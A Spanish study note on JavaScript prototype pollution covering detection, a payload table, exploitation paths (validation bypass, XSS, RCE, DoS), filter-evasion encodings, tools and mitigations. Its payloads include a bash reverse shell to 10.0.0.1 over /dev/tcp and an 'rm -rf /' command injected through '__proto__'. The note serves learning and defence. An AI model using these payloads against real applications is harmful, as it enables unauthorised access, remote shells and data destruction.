
---
Tags: #web #json #objetos #propiedades #protoypePollution #burpsuite

---
## 📌 Definición

[[Prototype Pollution]] es una vulnerabilidad que afecta a aplicaciones JavaScript (principalmente en **Node.js** y entornos que usan objetos prototipo).  
Ocurre cuando un atacante puede **modificar el prototipo base (`Object.prototype`)** de todos los objetos, lo que provoca que nuevas propiedades maliciosas se propaguen a todos los objetos de la aplicación.

---

## ⚙️ Funcionamiento lógico

En JavaScript, casi todos los objetos heredan propiedades y métodos de `Object.prototype`.  
Si un atacante consigue inyectar propiedades en el prototipo base, **todos los objetos existentes y futuros** pueden verse afectados.

Ejemplo simple:

// Inyección maliciosa
`Object.prototype.isAdmin = true;  

// Efecto en todos los objetos 
`let user = {}; console.log(user.isAdmin); // true`

---

## 🔍 Detección de la vulnerabilidad

### Métodos para identificar:

- Revisar código en busca de funciones que mezclen objetos sin sanitizar (`Object.assign`, `_.merge`, `$.extend`).
    
- En APIs REST, probar parámetros como:
    
```ruby
?__proto__[isAdmin]=true ?constructor[prototype][isAdmin]=true
```

- En JSON:
    
```json
{   "__proto__": {     "isAdmin": true   } }
```

- Observar comportamientos inesperados (flags activados, bypass de validaciones).
    

---

## 💥 Vectores de ataque comunes

|**Payload**|**Descripción**|
|---|---|
|`?__proto__[isAdmin]=true`|Inyecta propiedad `isAdmin` en todos los objetos|
|`?constructor[prototype][polluted]=yes`|Variante usando constructor|
|`{"__proto__": {"toString": "hacked"}}`|Cambia comportamiento del método `toString`|
|`{"constructor": {"prototype": {"XSS": "<script>alert(1)</script>"}}}`|Inyecta XSS en plantillas|
|`?__proto__[shell]=bash+-i+>%26+/dev/tcp/10.0.0.1/4444+0>%261`|Reverse shell si el valor se ejecuta|

---

## 🛠️ Técnicas de explotación

1. **Bypass de validaciones**
    
    - Si el código hace algo como:
        ```js
        if (user.isAdmin) { /* acceso permitido */ }
		```

        y `isAdmin` es `true` en `Object.prototype`, se saltará el control.
        
2. **XSS / HTML Injection**
    
    - Insertando payloads en el prototipo que luego son renderizados.
        
        ```json
        {"__proto__": {"payload": "<img src=x onerror=alert(1)>" }}
		```
        
3. **RCE (Remote Code Execution)**
    
    - En entornos donde los valores del prototipo llegan a funciones `eval()` o equivalentes.
        
    - Ejemplo:
        
        ```js
        {"__proto__": {"command": "rm -rf /"}}
		```
        
4. **DoS (Denial of Service)**
    
    - Añadiendo propiedades pesadas o sobreescribiendo métodos clave como `toString` o `valueOf`.
        

---

## 🧩 Métodos de bypass

- Usar codificación de caracteres para evadir filtros:
    
    - `%5f%5fproto%5f%5f` en vez de `__proto__`
        
    - `%63onstructor` para `constructor`
        
- Anidar propiedades para saltar validaciones superficiales:
    

```json
{"a":{"__proto__":{"isAdmin":true}}}
```

- Usar otros prototipos como `Array.prototype` o `Function.prototype`.
    

---

## 🔧 Herramientas útiles

|Herramienta|Uso|
|---|---|
|**PPScan**|Escáner para detectar Prototype Pollution en JS y Node.js|
|**Burp Suite** + Intruder|Automatizar pruebas con parámetros `__proto__`|
|**qs** / **lodash**|Librerías que históricamente han tenido esta vulnerabilidad, buen punto para fuzzing|
|**DOM Invader (PortSwigger)**|Detecta contaminación en variables del lado cliente|

---

## 📜 Ejemplo real de explotación

**Escenario:**  
Una API en Node.js usa `lodash.merge` para combinar datos del usuario con la configuración por defecto:

```js
const _ = require('lodash'); let config = {debug: false}; _.merge(config, JSON.parse(req.body));
```

**Payload malicioso:**

```json
{"__proto__": {"debug": true}}
```

**Resultado:**

- `config.debug` pasa a ser `true`.
    
- Todos los objetos futuros tendrán `debug` activado.
    

---

## 🛡️ Mitigación

- Usar librerías actualizadas (`lodash`, `qs`, `merge`).
    
- Bloquear claves peligrosas (`__proto__`, `prototype`, `constructor`).
    
- Usar `Object.create(null)` para evitar herencia de prototipo.
    
- Validar entradas antes de combinarlas con objetos globales.

